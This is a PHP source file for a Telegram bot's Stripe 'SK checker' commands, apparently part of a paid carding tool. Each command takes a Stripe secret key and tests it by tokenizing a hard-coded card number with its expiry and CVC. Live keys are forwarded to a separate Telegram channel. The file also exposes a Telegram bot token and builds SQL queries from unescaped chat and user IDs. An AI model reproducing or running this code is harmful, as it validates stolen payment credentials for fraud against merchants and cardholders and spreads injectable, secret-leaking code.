<?php
if ((strpos($message, ".dsk") === 0) || (strpos($message, "/dsk") === 0)) {
    //------------GROUP AUTHORIED SECTION-----/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT * FROM chatauth WHERE chatsid='$chatId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $json_array[] = $row;
    }
    $fchatid = json_encode($json_array);
    $achat = trim(strip_tags(getStr($fchatid, '"chatsid":"', '"')));
    if ($achat != $chatId and $ctype == "supergroup") {
        $respchat = "𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗖𝗵𝗮𝘁 ⚠️.𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @predator_am or @asur_sinchan 𝘁𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲.";
        reply_to($chatId, $respchat, $message_id);
        exit();
    }
    //----------PERSONAL ACCESS--------------/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT role FROM persons WHERE userid='$userId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
        $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"', '"')));
    if (empty($role)) {
        reply_to($chatId, $noregister, $message_id);
        exit();
    }


    $sec = substr($message, 4);
    $editsms = "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗪𝗮𝗶𝘁....";
    $sss = reply_to($chatId, $editsms, $message_id);
    $respon = json_decode($sss, TRUE);
    $message_id_1 = $respon['result']['message_id'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
    curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $resultk = curl_exec($ch);

    $info1 = curl_getinfo($ch);



    $time1 = $info1['total_time'];

    $httpCode = $info1['http_code'];
    $time1 = substr($time1, 0, 4);
    curl_close($ch);

    $mtc = "-1001526549384";

    if (strpos($resultk, 'tok_')) {
        $message = urlencode("𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅

𝗞𝗘𝗬➔<code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧➔ SK LIVE ✅

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time1 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 𝗕𝘆 <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");
        edit_message($chatId, $message, $message_id_1);
        $yehi = urlencode("<code>$sec</code>
<b>LIVE KEY ✅</b>");
        hits_to($mtc, $yehi);

        exit();
    } elseif (strpos($resultk, 'Invalid API Key provided')) {
        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬➔<code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧➔ INVALID KEY PROVIDED ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 𝗕𝘆 <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time1 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 𝗕𝘆 <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");
        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'You did not provide an API key.')) {

        $message = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗦𝗞 𝗞𝗘𝗬 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️";

        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'rate_limit')) {

        $message = urlencode("𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅

𝗞𝗘𝗬 ➺ <code>$sec </code>
𝗥𝗘𝗦𝗨𝗟𝗧➔ RATE LIMIT ⚠️
𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time1 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        $yehi = urlencode("<code>$sec</code>
<b>LIVE KEY BUT RATE LIMIT ✅</b>");
        hits_to($mtc, $yehi);
        exit();
    } elseif ((strpos($resultk, 'testmode_charges_only')) || (strpos($resultk, 'test_mode_live_card'))) {

        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬 ➺ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➺ TESTMODE CHARGES SK ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time1 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'api_key_expired')) {

        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔ EXPIRED KEY ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time1 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        exit();
    } else {

        $message = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗦𝗞 𝗞𝗘𝗬 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️";
        edit_message($chatId, $message, $message_id_1);
        exit();
    }
}

///test sk //


if ((strpos($message, "sk_") === 0) || (strpos($message, "sk_") === 0)) {
    //------------GROUP AUTHORIED SECTION-----/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT * FROM chatauth WHERE chatsid='$chatId'";
    $result = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result)) {
        $json_array[] = $row;
    }
    $fchatid = json_encode($json_array);
    $achat = trim(strip_tags(getStr($fchatid, '"chatsid":"', '"')));
    if ($achat != $chatId and $ctype == "supergroup") {
        $respchat = "𝗨𝗻𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘀𝗲𝗱 𝗖𝗵𝗮𝘁 ⚠️.𝗖𝗼𝗻𝘁𝗮𝗰𝘁 @predator_am or @asur_sinchan 𝘁𝗼 𝗮𝘂𝘁𝗵𝗼𝗿𝗶𝘇𝗲.";
        reply_to($chatId, $respchat, $message_id);
        exit();
    }
    //----------PERSONAL ACCESS--------------/
    $link = mysqli_connect($host, $dbuser, $dbpass, $dbname);
    $sql = "SELECT role FROM persons WHERE userid='$userId'";
    $result20 = mysqli_query($link, $sql);
    $json_array = [];
    while ($row = mysqli_fetch_assoc($result20)) {
        $json_array[] = $row;
    }
    $final201 = json_encode($json_array);
    $role = trim(strip_tags(getStr($final201, '"role":"', '"')));
    if ($chatId == $userId and $role == 'FREE') {
        $pers = "𝗢𝗡𝗟𝗬 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗠𝗘𝗠𝗕𝗘𝗥𝗦 𝗔𝗥𝗘 𝗔𝗟𝗟𝗢𝗪𝗘𝗗 𝗧𝗢 𝗨𝗦𝗘 𝗕𝗢𝗧 𝗜𝗡 𝗣𝗘𝗥𝗦𝗢𝗡𝗔𝗟 ⚠️. 𝗕𝘂𝘆 𝗣𝗿𝗲𝗺𝗶𝘂𝗺 𝘂𝘀𝗶𝗻𝗴 /buy";
        reply_to($chatId, $pers, $message_id);
        exit();
    } elseif (empty($role)) {
        reply_to($chatId, $noregister, $message_id);
        exit();
    }



    $sec = substr($message, 0);
    $editsms = "𝗖𝗵𝗲𝗰𝗸𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗦𝗞 𝗪𝗮𝗶𝘁....";
    $sss = reply_to($chatId, $editsms, $message_id);

    $respon = json_decode($sss, TRUE);

    $message_id_1 = $respon['result']['message_id'];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/tokens');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "card[number]=5154620061414478&card[exp_month]=01&card[exp_year]=2023&card[cvc]=235");
    curl_setopt($ch, CURLOPT_USERPWD, $sec . ':' . '');
    $headers = array();
    $headers[] = 'Content-Type: application/x-www-form-urlencoded';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $resultk = curl_exec($ch);

    $info2 = curl_getinfo($ch);



    $time2 = $info2['total_time'];

    $httpCode = $info2['http_code'];
    $time2 = substr($time2, 0, 4);
    curl_close($ch);

    $dedo = "https://api.telegram.org/bot5152228147:AAFlwFTsE_M2hgbioXdI-iPxTB2MRO0SyG8";
    $mtc = "-1001526549384";


    if (strpos($resultk, 'tok_')) {
        $message = urlencode("𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔  SK LIVE ✅

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time2 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");
        edit_message($chatId, $message, $message_id_1);
        $yehi = urlencode("<code>$sec</code>
<b>LIVE KEY ✅</b>");
        hits_to($mtc, $yehi);

        exit();
    } elseif (strpos($resultk, 'Invalid API Key provided')) {
        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔ INVALID KEY PROVIDED ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time2 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");
        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'You did not provide an API key.')) {

        $message = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗦𝗞 𝗞𝗘𝗬 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️";

        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'rate_limit')) {

        $message = urlencode("𝗟𝗜𝗩𝗘 𝗞𝗘𝗬 ✅

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔ RATE LIMIT ⚠️

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time2 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        $yehi = urlencode("<code>$sec</code>
<b>LIVE KEY BUT RATE LIMIT✅</b>");
        hits_to($mtc, $yehi);
        exit();
    } elseif ((strpos($resultk, 'testmode_charges_only')) || (strpos($resultk, 'test_mode_live_card'))) {

        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔ TESTMODE CHARGES SK ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time2 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        exit();
    } elseif (strpos($resultk, 'api_key_expired')) {

        $message = urlencode("𝗗𝗘𝗔𝗗 𝗞𝗘𝗬 ❌

𝗞𝗘𝗬 ➔ <code>$sec </code>

𝗥𝗘𝗦𝗨𝗟𝗧 ➔ EXPIRED KEY ❌

𝗖𝗵𝗲𝗰𝗸𝗲𝗱 ➺ <a href='tg://user?id=$userId'>$firstname</a> [ $role ]
𝗧𝗼𝗼𝗸 $time2 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 

𝗕𝗼𝘁 𝗠𝗮𝗱𝗲 ➺ <a href='tg://user?id=5545098876'>predator</a> x <a href='tg://user?id=916264684'>asur</a>");

        edit_message($chatId, $message, $message_id_1);
        exit();
    } else {

        $message = "𝗣𝗟𝗘𝗔𝗦𝗘 𝗣𝗥𝗢𝗩𝗜𝗗𝗘 𝗔 𝗦𝗞 𝗞𝗘𝗬 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 ⚠️";
        edit_message($chatId, $message, $message_id_1);
        exit();
    }
}
